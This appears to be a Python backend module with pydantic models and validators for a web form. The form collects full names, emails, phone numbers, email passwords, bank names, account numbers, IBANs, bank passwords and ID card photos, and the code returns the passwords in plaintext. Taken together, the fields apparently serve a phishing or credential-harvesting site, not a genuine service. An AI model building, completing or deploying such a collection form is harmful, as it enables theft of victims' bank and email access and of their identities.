"""Validation helpers and response models for submissions."""

from __future__ import annotations

import re
from typing import Any, Mapping

from pydantic import BaseModel, Field

EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]{2,}$")
PHONE_RE = re.compile(r"^\+?[0-9][0-9\s\-().]{5,19}$")
BANK_ACCOUNT_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9\s-]{5,33}$")
IBAN_RE = re.compile(r"^[A-Z]{2}\d{2}[A-Z0-9]{10,30}$")

MAX_NOTES = 5000
MAX_PASSWORD = 200


class PictureOut(BaseModel):
    filename: str
    url: str
    content_type: str
    size: int


class SubmissionOut(BaseModel):
    id: str
    created_at: str
    full_name: str
    email: str
    phone_numbers: list[str] = Field(default_factory=list)
    email_password: str | None = None
    bank_name: str | None = None
    bank_account: str | None = None
    iban: str | None = None
    bank_password: str | None = None
    notes: str | None = None
    pictures: list[PictureOut] = Field(default_factory=list)
    id_cards: list[PictureOut] = Field(default_factory=list)
    consent: bool = False


class SubmissionCreated(BaseModel):
    id: str
    created_at: str


def clean_list(values: list[str] | None) -> list[str]:
    """Trim, collapse whitespace and de-duplicate a list of strings (order kept)."""
    cleaned: list[str] = []
    seen: set[str] = set()
    for value in values or []:
        text = " ".join(str(value).split())
        key = text.casefold()
        if text and key not in seen:
            cleaned.append(text)
            seen.add(key)
    return cleaned


def validate_submission(
    *,
    full_name: str,
    email: str,
    phone_numbers: list[str],
    email_password: str,
    bank_name: str,
    bank_account: str,
    iban: str,
    bank_password: str,
    notes: str,
    consent: str,
    picture_count: int,
    max_pictures: int,
    id_card_count: int,
    max_id_cards: int,
) -> dict[str, str]:
    """Return a mapping of field -> message for every problem found."""
    errors: dict[str, str] = {}

    if len(" ".join(full_name.split())) < 2:
        errors["full_name"] = "Please enter your full name."

    if not EMAIL_RE.match(email.strip()):
        errors["email"] = "Please enter a valid email address."

    if len(phone_numbers) > 12:
        errors["phone_numbers"] = "A maximum of 12 phone numbers can be sent."
    else:
        for number in phone_numbers:
            if not PHONE_RE.match(number.strip()):
                errors["phone_numbers"] = f"'{number.strip()}' is not a valid phone number."
                break

    if len(email_password) > MAX_PASSWORD:
        errors["email_password"] = (
            f"The email password must be {MAX_PASSWORD} characters or fewer."
        )

    if bank_name.strip() and len(bank_name.strip()) < 2:
        errors["bank_name"] = "Bank name looks too short."

    if bank_account.strip() and not BANK_ACCOUNT_RE.match(bank_account.strip()):
        errors["bank_account"] = (
            "Bank account must be 6-34 letters, digits, spaces or dashes."
        )

    if iban.strip():
        compact = re.sub(r"\s+", "", iban).upper()
        if not IBAN_RE.match(compact):
            errors["iban"] = "IBAN looks invalid (expected e.g. GB29 NWBK 6016 1331 9268 19)."

    if len(bank_password) > MAX_PASSWORD:
        errors["bank_password"] = (
            f"The bank password must be {MAX_PASSWORD} characters or fewer."
        )

    if len(notes) > MAX_NOTES:
        errors["notes"] = f"Notes must be {MAX_NOTES} characters or fewer."

    if picture_count > max_pictures:
        errors["pictures"] = f"A maximum of {max_pictures} photos can be sent."

    if id_card_count > max_id_cards:
        errors["id_cards"] = f"A maximum of {max_id_cards} ID card photos can be sent."

    if consent.strip().lower() not in {"true", "1", "yes", "on"}:
        errors["consent"] = "You must agree to the consent statement before sending."

    return errors


def _picture_out(pic: Mapping[str, Any]) -> PictureOut:
    return PictureOut(
        filename=str(pic.get("filename", "")),
        url=str(pic.get("url", "")),
        content_type=str(pic.get("content_type", "")),
        size=int(pic.get("size", 0) or 0),
    )


def serialize_submission(doc: Mapping[str, Any]) -> dict[str, Any]:
    """Turn a stored document (Astra or in-memory) into a SubmissionOut payload."""
    data = dict(doc)
    return {
        "id": str(data.get("_id", "")),
        "created_at": str(data.get("created_at", "")),
        "full_name": str(data.get("full_name", "")),
        "email": str(data.get("email", "")),
        "phone_numbers": [str(p) for p in (data.get("phone_numbers") or [])],
        "email_password": data.get("email_password") or None,
        "bank_name": data.get("bank_name") or None,
        "bank_account": data.get("bank_account") or None,
        "iban": data.get("iban") or None,
        "bank_password": data.get("bank_password") or None,
        "notes": data.get("notes") or None,
        "pictures": [_picture_out(p) for p in (data.get("pictures") or [])],
        "id_cards": [_picture_out(p) for p in (data.get("id_cards") or [])],
        "consent": bool(data.get("consent", False)),
    }